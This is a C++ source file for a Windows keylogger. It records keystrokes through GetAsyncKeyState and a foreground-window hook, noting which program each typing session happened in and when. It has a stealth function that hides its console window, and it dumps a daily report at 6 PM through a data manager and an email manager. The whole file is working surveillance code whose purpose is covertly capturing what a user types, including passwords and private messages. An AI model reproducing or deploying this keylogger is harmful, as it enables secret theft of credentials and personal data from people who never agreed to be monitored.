
#include "LoggingManager.h"
#include <crtdbg.h>
using namespace System;
using namespace System::Threading;

DataManager dataManager = DataManager();
EmailManager emailManager = EmailManager();
Entry dataEntry = Entry();
int theCount = -1, threadCounter = 0;
DWORD dwPID, mythreadid;
HWND window;
time_t rawStartTime, rawEndTime;
HANDLE myhandle;
string startTime, endTime, loggedKeystrokes, wnd_title;

void save (int key_stroke){
    // ignore input from any key that is not alpha, num, enter, tab and backspace
    int ignoredStrokes [] = {1,2,3,4,16,18,20,27,33,34,35,36,37,38,39,40,45,46,91,92,112,113,114,115,116,117,118,119,120,121,122,123};

    // terminate early if the key is not important
    for(int i = 0; i < sizeof(ignoredStrokes)/sizeof(ignoredStrokes[0]); i++) {
        if(key_stroke == ignoredStrokes[i]) {
            return;
        }
    }

    // store data in loggedKeystrokes array
    if(key_stroke == 8) loggedKeystrokes += "[BACKSPACE]";
    else if(key_stroke == 32) loggedKeystrokes += " ";
    else if(key_stroke == 13) loggedKeystrokes += "\n";
    else loggedKeystrokes += key_stroke;
}

void stealth () {
    // determine the location of the program and put it into stealth mode
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

string GetProcessName(DWORD dwPID) {
    // create handle for help program
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwPID);

    if(hSnapshot) {
        tagPROCESSENTRY32 peInfo;
        peInfo.dwSize = sizeof(peInfo);
        BOOL nextProcess = Process32First(hSnapshot, &peInfo);
        bool found = false;

        while(nextProcess) {
            if(peInfo.th32ProcessID == dwPID) {
                found = true;
                break;
            }
            nextProcess= Process32Next(hSnapshot, &peInfo);
        }

        // return program name without extension
        if(found) {
            string programName = peInfo.szExeFile;
            return programName.substr(0,programName.find_last_of("."));
        }

        // close handle for help program
        CloseHandle(hSnapshot);
    }
	return "Unknown";
}

timeStruct getTime() {
    time_t rawtime;
    struct tm * timeinfo;
    char buffer[80];

    // generate time info
    time(&rawtime);
    timeinfo = localtime(&rawtime);

    // format time
    strftime(buffer,sizeof(buffer),"%m/%d/%Y-%H:%M:%S",timeinfo);
    string str(buffer);

    // create struct and return data
    timeStruct myStruct;
    myStruct.rawtime = rawtime;
    myStruct.str = str;
    return myStruct;
}

// function to pause for specified amount of seconds
void pause(int dur) {
    int temp = time(NULL) + dur;
    while(temp > time(NULL));
}

// thread used to monitor keystrokes
DWORD WINAPI mythread(LPVOID lpParameter) {
    // hide window
    //stealth();

    char i;
    BOOL sendReport = false;

    // running thread
    while(1){
        // only check for this range of ASCII codes
        for (i = 8; i<=190; i++){
            // get current time and strip date
			System::DateTime currentTime = System::DateTime().Now;			
			bool timeToProcess = currentTime.Hour == 18;			

            // begin processing report at 6:00 PM
            if(timeToProcess && !sendReport) {
				
                // call dumpday
                dataManager.DumpDay();
                emailManager.readAnalysisResults();
                sendReport = true;
				
				break;

            } 
			else if(!timeToProcess) {
                sendReport = false;
            }

            // clear loggedKeystrokes if session ends
            if(theCount > 0 && threadCounter != theCount) {
                pause(1);
                loggedKeystrokes.clear();
                threadCounter = theCount;

            }

            // continuously check for key input
            if (GetAsyncKeyState(i) == -32767) {
                if(theCount > -1) {
                    save(i);
                }
            }
        }
    }
}


/*string Entry::toString() {
	string temp = "{\"active_process\": \"" + programName + "\", \"process_id\": \"" + procid + "\", \"start_time\": \"" + startTime + "\", \"end_time\": \"" + endTime + "\", \"session_duration\": \"" + duration + "\", \"logged_keystrokes\": \"" + text + "\"}";
	return temp;
} */

// function triggered whenever a window becomes active
void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {

    DWORD newPID;

    // get active window handle
    HWND newWindow=GetForegroundWindow();

    // get process id
    GetWindowThreadProcessId(newWindow, &newPID);

    // get program name
    string newWnd_title = GetProcessName(newPID);

    // get time info
    timeStruct timeData = getTime();
    time_t newRawStartTime = timeData.rawtime;
    string newStartTime = timeData.str;
    rawEndTime = newRawStartTime;
    endTime = newStartTime;

    // trigger end of session
	theCount++;
    if(theCount > 0) {
        time_t duration = rawEndTime - rawStartTime;

		std::stringstream ss;
		ss << duration;
		std::string ts = ss.str();

		std::stringstream dd;
		dd << dwPID;
		std::string ds = dd.str();

        // store info in Entry Object
        dataEntry.startTime = startTime;
        dataEntry.endTime = endTime;
        dataEntry.duration = ts;
        dataEntry.text = loggedKeystrokes;
        dataEntry.programName = wnd_title;
        dataEntry.procid = ds;

		//cout << "{\"active_process\": \"" << wnd_title << "\", \"process_id\": \"" << dwPID << "\", \"start_time\": \"" << startTime << "\", \"end_time\": \"" << endTime << "\", \"session_duration\": \"" << duration << "\", \"logged_keystrokes\": \"" << loggedKeystrokes << "\"}";

        // call put
        dataManager.put(dataEntry);
    }

    // dequeue the stored window information
    window = newWindow;
    dwPID = newPID;
    wnd_title = newWnd_title;
    rawStartTime = newRawStartTime;
    startTime = newStartTime;

}

// function to start active window listener
void getWindows() {
    MSG messages;
    GetMessage(&messages, NULL, 0, 0);
}

// initialize keylog thread and event hook for active window monitoring
void init() {
    HWINEVENTHOOK hook;
	dataManager.init();
    hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND , EVENT_SYSTEM_FOREGROUND ,NULL, HandleWinEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    myhandle = CreateThread(0, 0, mythread, 0, 0, &mythreadid);
    getWindows();
}


//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
int main()
{	
	//_CrtSetDbgFlag(_CRTDBG_CHECK_ALWAYS_DF);

	init();
	return 0;
}
